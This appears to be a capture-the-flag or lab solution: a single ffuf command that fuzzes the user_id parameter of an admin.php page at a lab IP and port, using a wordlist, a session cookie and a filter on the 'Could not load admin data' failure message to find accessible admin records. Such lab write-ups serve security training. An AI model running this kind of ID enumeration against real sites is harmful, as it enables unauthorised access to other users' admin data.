


Solution: 

ffuf -w ./id.txt:FUZZ -u http://94.237.58.210:51698/admin.php?user_id=FUZZ  -b "PHPSESSID=pd9cje1j0mcvsn7vd83i39k747"  -fr "Could not load admin data"